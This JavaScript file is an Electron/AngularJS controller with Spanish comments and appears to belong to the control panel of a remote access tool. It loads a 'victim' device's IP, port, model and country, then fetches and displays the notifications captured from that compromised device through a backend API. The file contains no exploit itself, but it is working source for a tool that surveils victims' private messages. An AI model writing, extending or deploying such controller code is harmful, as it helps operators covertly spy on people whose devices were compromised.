const { remote } = require('electron');
const { ipcRenderer } = require('electron');
const fs = require('fs');
// NO declares el módulo aquí, solo usa el existente
// var app = angular.module('myappy', []);

var victim = remote.getCurrentWebContents().victim;

angular.module('myappy').controller("NotifiCtrl", function($scope, $http, $location) {
    // Datos del dispositivo víctima (puedes mantenerlos si los usas en otras vistas)
    $scope.victimSocket = victim.ip + ":" + victim.port;
    $scope.victimModel = victim.model;
    $scope.victimCountry = victim.country;
    // Cambios aquí: prioriza victim.id
    $scope.victim = (victim && victim.id) ? victim.id :
                    ((victim.ip && victim.port) ? (victim.ip + ":" + victim.port) : "");

    // Variable para pestaña activa en la vista
    $scope.activeTab = 'all';

    // Función para cargar el historial de notificaciones desde el backend
    $scope.loadNotifications = function() {
        const victimId = String($scope.victim).trim();
        console.log("FETCHING NOTIFICATIONS FOR:", victimId);
        $http.get('/api/notifications/' + victimId)
          .then(function(response) {
            $scope.notifications = response.data; // Array de objetos o texto plano
          }, function(error) {
            $scope.notifications = ["No se pudo cargar notificaciones."];
          });
    };

    // Carga inicial
    $scope.loadNotifications();
});